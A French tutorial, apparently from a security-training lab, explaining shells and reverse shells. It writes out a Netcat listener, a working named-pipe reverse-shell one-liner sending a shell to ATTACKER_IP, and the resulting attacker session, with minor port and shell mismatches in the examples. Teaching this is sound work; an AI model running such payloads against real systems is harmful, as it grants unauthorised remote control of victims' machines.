# Qu'est-ce qu'un Shell ?

Un shell est un logiciel qui permet à un utilisateur d'interagir avec un système d'exploitation. Il peut s'agir d'une interface graphique, mais il s'agit généralement d'une interface en ligne de commande, selon le système d'exploitation exécuté sur le système cible.

En cybersécurité, il fait généralement référence à une session shell spécifique qu'un attaquant utilise lors de l'accès à un système compromis, lui permettant d'exécuter des commandes et des logiciels. Cela permet aux attaquants d'effectuer plusieurs activités, dont certaines sont décrites ci-dessous.

**Contrôle à distance du système** : permet à l'attaquant d'exécuter des commandes ou des logiciels à distance sur le système cible.

**Élévation de privilèges** : si l'accès initial via un shell est limité ou restreint, les attaquants peuvent explorer des moyens d'élever leurs privilèges vers un accès plus élevé ou administratif.

**Exfiltration de données** : une fois que les attaquants ont accès à l'exécution de commandes via un shell obtenu, ils peuvent explorer le système pour lire et copier des données sensibles.

**Persistance et maintien de l'accès** : une fois l'accès au shell obtenu, les attaquants peuvent créer des accès via des utilisateurs et des identifiants ou copier des logiciels backdoor pour maintenir l'accès au système cible pour une utilisation ultérieure.

**Activités post-exploitation** : après l'obtention d'un accès au shell, les attaquants peuvent effectuer un large éventail d'activités post-exploitation, telles que le déploiement de malwares, la création de comptes cachés et la suppression d'informations.

**Accès à d'autres systèmes sur le réseau** : selon les intentions de l'attaquant, le shell obtenu peut n'être qu'un point d'accès initial. L'objectif peut être de rebondir à travers le réseau vers une cible différente en utilisant le shell obtenu comme pivot vers différents points du réseau du système compromis. C'est ce qu'on appelle le pivoting.

Tous les shells que nous décrirons dans les prochaines tâches peuvent aider à contourner différentes limitations des attaques décrites ci-dessus.

---

## Reverse Shell

Un reverse shell, parfois appelé "connect back shell", est l'une des techniques les plus populaires pour obtenir l'accès à un système lors de cyberattaques. Les connexions sont initiées depuis le système cible vers la machine de l'attaquant, ce qui peut aider à éviter la détection par les pare-feu réseau et autres dispositifs de sécurité.

### Comment fonctionnent les Reverse Shells

#### Configuration d'un écouteur Netcat (nc)

Comprenons maintenant comment fonctionne un reverse shell dans un scénario pratique en utilisant l'outil Netcat. Cet utilitaire prend en charge plusieurs systèmes d'exploitation et permet la lecture et l'écriture via un réseau.

Comme mentionné ci-dessus, un reverse shell se connectera à la machine de l'attaquant. Cette machine attendra une connexion, utilisons donc Netcat pour écouter une connexion en utilisant la commande suivante : `nc -lvnp 443`.

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

La commande ci-dessus utilise l'option `-l` pour indiquer à Netcat d'écouter ou d'attendre une connexion. L'option `-v` active le mode verbeux. L'option `-n` empêche les connexions d'utiliser le DNS pour la recherche, elle n'utilisera donc qu'une adresse IP. Enfin, le flag `-p` indique le port qui sera utilisé pour attendre la connexion, dans le cas ci-dessus, le port 443.

N'importe quel port peut être utilisé pour attendre une connexion, mais les attaquants et les pentesters ont tendance à utiliser des ports connus utilisés par d'autres applications comme 53, 80, 8080, 443, 139 ou 445. Cela permet de mélanger le reverse shell avec du trafic légitime et d'éviter la détection par les dispositifs de sécurité.

#### Obtention d'un accès Reverse Shell

Une fois notre écouteur configuré, l'attaquant doit exécuter ce qu'on appelle un payload de reverse shell. Ce payload exploite généralement la vulnérabilité ou l'accès non autorisé accordé par l'attaquant et exécute une commande qui exposera le shell via le réseau. Il existe une variété de payloads qui dépendront des outils et du système d'exploitation du système compromis.

À titre d'exemple, analysons un payload appelé pipe reverse shell, comme indiqué ci-dessous.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Explication du Payload :**

- `rm -f /tmp/f` - Cette commande supprime tout fichier de pipe nommé existant situé à `/tmp/f/`. Cela garantit que le script peut créer un nouveau pipe nommé sans conflits.

- `mkfifo /tmp/f` - Cette commande crée un pipe nommé, ou FIFO (first-in, first-out), à `/tmp/f`. Les pipes nommés permettent une communication bidirectionnelle entre les processus. Dans ce contexte, il agit comme un conduit pour l'entrée et la sortie.

- `cat /tmp/f` - Cette commande lit les données du pipe nommé. Elle attend une entrée qui peut être envoyée via le pipe.

- `| bash -i 2>&1` - La sortie de cat est redirigée vers une instance de shell (bash -i), ce qui permet à l'attaquant d'exécuter des commandes de manière interactive. Le `2>&1` redirige l'erreur standard vers la sortie standard, garantissant que les messages d'erreur sont renvoyés à l'attaquant.

- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - Cette partie redirige la sortie du shell via nc (Netcat) vers l'adresse IP de l'attaquant (ATTACKER_IP) sur le port de l'attaquant (ATTACKER_PORT).

- `>/tmp/f` - Cette dernière partie renvoie la sortie des commandes dans le pipe nommé, permettant une communication bidirectionnelle.

Le payload ci-dessus peut exposer le shell bash via le réseau à l'écouteur souhaité.

#### L'attaquant reçoit le Shell

Une fois le payload ci-dessus exécuté, l'attaquant recevra un reverse shell, comme indiqué ci-dessous, lui permettant d'exécuter des commandes comme s'il se connectait à un terminal normal du système d'exploitation.

**Sortie du terminal de l'attaquant (Réception du Shell) :**

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

target@tryhackme:~$
```